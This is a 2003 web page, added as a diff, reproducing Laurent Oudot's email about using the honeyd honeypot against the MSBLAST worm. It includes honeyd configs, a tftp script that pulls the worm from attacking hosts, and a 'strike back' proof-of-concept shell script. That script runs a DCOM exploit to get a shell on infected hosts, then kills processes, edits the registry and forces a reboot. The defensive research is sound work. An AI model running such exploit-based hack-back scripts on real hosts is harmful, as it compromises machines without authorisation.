@@ -1,0 +1,264 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+  <head>
+    <title>Honeyd fights Windows Worms!</title>
+<style type="text/css">
+<!--
+body,p,b,i,ul,ol,li,td { font-family: arial, helvetica, sans-serif; }
+h1,h2,h3,h4,h5 { font-family: arial, helvetica, sans-serif;
+    font-weight: bold; }
+div.body { margin-left: 32px; }
+pre { font-family: monospace; }
+-->
+</style>
+  </head>
+
+  <body>
+  <body bgcolor="#ffffff">
+    <table noboder cellspacing="0" cellpadding="0" width="90%">
+      <tr>
+	  <td bgcolor="#0880b8" nowrap>
+	    <font size="-1" face="Arial,Helvetica" color="#30c0f0">
+		&nbsp;&nbsp;
+		Center for Information Technology Integration
+		&nbsp;&nbsp;
+	      <br>
+	      </font>
+	    <center>
+	      <font size="+3" face="Arial,Helvetica" color="#50d0ff">
+		Honeyd Vs MSBLAST.EXE
+	      </font>
+	    </center>
+	  </td>
+	    <td bgcolor="#0880b8">
+	      &nbsp;&nbsp;
+	    </td>
+	</tr>
+	<tr>
+	  <td>
+	    &nbsp;
+	  </td>
+	</tr>
+	<tr>
+	  <td bgcolor="#eeeeee">
+	    <dl>
+	      <dd>
+<p>
+<h1>Honeyd Vs MSBLAST.EXE</h1>
+<em>From an email by Laurent Oudot of the Rstack team</em><br>
+<em>2003-08-19</em><br>
+<p>
+<h2>Fighting worms with honeypots: honeyd vs msblast.exe</h2>
+While trying to help the community to fight the evil worm MSBLAST, i 
+looked at my favorite honeypot, called honeyd, to check if we could not 
+play with the worm itself (Labrea played with another worm in the 
+past... the past should not be forgotten).
+<p>
+[Honeyd is a free software product by Niels Provos : 
+<a href="http://www.citi.umich.edu/u/provos/honeyd">http://www.citi.umich.edu/u/provos/honeyd</a>]
+<p>
+As i saw a growing number of TCP requests against my honeyd (port 135) i 
+decided to open the port (look at honeyd conf file for that) :
+<dl>
+<dd>
+<table noborder cellpadding="0" cellspacing="0" center>
+<tr><td nowrap bgcolor="#aaddbb">
+<pre>
+add template tcp port 135 open
+</pre>
+</td></tr>
+</table>
+</dd>
+</dl>
+<p>
+Wooo, i got plenty of (fake) TCP sessions against this port. A tcpdump 
+could allow to learn what was launched against this port (tcpdump -n -w 
+135.cap -s 1514 tcp and port 135). This could be used to analyse the 
+virus network payload and shellcode.
+<p>
+Then i learned that the worm called MSBLAST wanted to get a shell over 
+the 4444 TCP port. So i created a fake service over the TCP port 4444, 
+to play with the worm :
+<p>
+<dl>
+<dd>
+<table noborder cellpadding="0" cellspacing="0" center>
+<tr><td nowrap bgcolor="#aaddbb">
+<pre>
+add template tcp port 4444 "/bin/sh scripts/4444.sh $ipsrc $ipdst"
+</pre>
+</pre>
+</td></tr>
+</table>
+</dd>
+</dl>
+<p>
+Owing to this 4444.sh script, it was then able to begin to work with the 
+worm itself.
+Almost firstable, this script 4444.sh was used to suck the worm directly 
+from the attacker. Here is an example that i created for fun with 
+moutane (rstack team) :
+<dl>
+<dd>
+<table noborder cellpadding="0" cellspacing="0" center>
+<tr><td nowrap bgcolor="#aaddbb">
+<pre>
+#!/bin/sh
+# we create a temporary directory for each specific attacker
+# to be sure we get every version on the wild
+mkdir /tmp/$1-$2
+cd /tmp/$1-$2
+# we connect via tftp to the attacker
+# and we get the msblast.exe file
+tftp $1 << EOF
+get msblast.exe
+quit
+EOF
+</pre>
+</td></tr>
+</table>
+</dd>
+</dl>
+<p>
+I restarted my honeyd. Then, every hosts owned by msblast that was 
+attacking my honeypot, first saw that the port 135 was opened. They then 
+sent their evil payload on it, and naturally tried to launch their 
+commands on the port 4444...
+I got the msblast.exe file in less than 5 minutes (internet is so evil 
+you know...) and give it to a friend for an internal analysis in the 
+rstack team.
+<p>
+Hmmm. This script (4444.sh) can easily be modified to do better things, 
+that's what we thought about...
+<p>
+Imagine that the honeypot sees an Msblast attack coming from a host. 
+That should mean that the host is infected by Msblast, right ?!
+<p>
+So, on an intranet, we tried to look at the possibility to automatically 
+clean an msblast'ed host that would attack the honeypot !
+<p>
+To be able to do that, we would only have to launch the same attack 
+against the attacker itself, in order to get a shell, and to kill the 
+evil process, and so on ("use the force luke...")
+<p>
+Bad thing would say laws-addicted guys. True. I agree.
+<p>
+So the idea was to strike back only against host from our internal 
+network, to avoid an attack against hosts that we don't manage (we 
+filtered the traffic in the final script and on an outbound router).
+<p>
+[!] This idea is very dangerous, cause bad people could use that to 
+automatically abuse infected hosts that attack them. I won't talk too 
+much about that to avoid another black hat script kiddy wave on the net.
+<p>
+Here is a funny proof of concept made with VG and Moutane for a 4444.sh 
+shell script.
+When an infected host attacks the honeypot, honeyd launch the script 
+that will connect itself to the infected attacker using the RPC DCOM 
+remote exploit made by [oc192.us], gaining a shell too !
+Then it will kill the process msblast.exe, the associated files on the 
+disk, and the will clean the registry.
+Remember it's a proof of concept.
+It will work against Windows XP hosts :
+<dl>
+<dd>
+<table noborder cellpadding="0" cellspacing="0" center>
+<tr><td nowrap bgcolor="#aaddbb">
+<pre>
+#!/bin/sh
+# launch the exploit against the internal attacker
+/usr/local/bin/evil_exploit_dcom -d $1 -t 1 -l 4445 << EOF
+taskkill /f /im msblast.exe /t
+del /f %SystemRoot%\System32\msblast.exe
+echo Windows Registry Editor Version 5.00 > c:\cleaner_msblast.reg
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] 
+ >> c:\cleaner_msblast.reg
+echo "windows auto update" = "REM msblast.exe" >> c:\cleaner_msblast.reg
+regedit /s c:\cleaner_msblast.reg
+del /f c:\cleaner_msblast.reg
+shutdown -r -f -t 0
+exit
+EOF
+</pre>
+</td></tr>
+</table>
+</dd>
+</dl>
+<p>
+We tried it.
+It worked :-)
+Every msblasted infected hosts on our intranet, while attacking the 
+honeypot, received a strong strike back answer, destroying the worm on 
+it ("in your face, from downtown").
+<p>
+If you search something better to remove the worm, you can replace part 
+of the script by a simple : "cscript cleaner.vbs" where cleaner.vbs 
+could be inspired by <a href="http://www.rstack.org/oudot/cleaner.vbs">http://www.rstack.org/oudot/cleaner.vbs</a>.
+<p>
+You can also try to automatically install the patch on the infected host 
+(look at microsoft web site for that, they propose a vbs script).
+<p>
+Honeyd, used like that, is more than a Honeypot, it also plays the role 
+of a kind of IDS (who is infected) and Intrusion Prevention System...
+<p>
+Big thanks to moutane and vg from the team rstack for their help and 
+ideas for the tests (infected hosts, etc).
+<p>
+life is short, have fun.
+<p>
+<address>oudot@rstack.org</address>
+member of the team rstack
+<a href="http://www.rstack.org">http://www.rstack.org</a>
+<p>
+NB: To force honeyd to answer to every hosts, launch arpd without 
+argument, and use a honeyd config file like that :
+<dl>
+<dd>
+<table noborder cellpadding="0" cellspacing="0" center>
+<tr><td nowrap bgcolor="#aaddbb">
+<pre>
+create default
+set default personality "Windows XP Pro"
+add default tcp port 135 open
+add default tcp port 4444 "/bin/sh scripts/4444.sh $ipsrc $ipdst"
+set default default tcp action closed
+set default default udp action closed
+set default uid 32767 gid 32767
+</pre>
+</td></tr>
+</table>
+</dd>
+</dl>
+<p>
+[<a href="http://www.citi.umich.edu/u/provos/honeyd/index.html">Back</a>]
+</dd>
+</dl>
+</td>
+<td bgcolor="#eeeeee">
+&nbsp;
+</td></tr>
+</table>
+    <hr>
+<table noborder cellspacing="0" cellpadding="2" width="90%">
+<tr><td>
+Questions and Comments:
+    <address><a href="mailto:provos@citi.umich.edu">Niels Provos</a></address>
+<!-- Created: Mon Mar 11 12:43:06 EST 2002 -->
+<!-- hhmts start -->
+Last modified: Fri Aug  1 21:12:20 EDT 2003
+<!-- hhmts end -->
+</td><td>
+&nbsp;
+</td><td bgcolor="#ddffdd" align="middle">
+You can keep me happy while hacking by reducing my
+Wishlists:
+<a href="http://www.citi.umich.edu/u/provos/wishlists/amazon.html">Books</a>,
+<a href="http://www.citi.umich.edu/u/provos/wishlists/cdnow.html">Music</a><br>
+</td>
+<td bgcolor="#ddffdd" align="middle">
+<a href="https://secure.bmtmicro.com/opera/buy-opera.html?AID=620358">
+<img src="http://www.citi.umich.edu/u/provos/pictures/ol-get-00-en-mic.gif" alt="[Get Opera!]" width="88" height="31"></a>
+</td></tr>
+</table>
+  </body>
+</html>
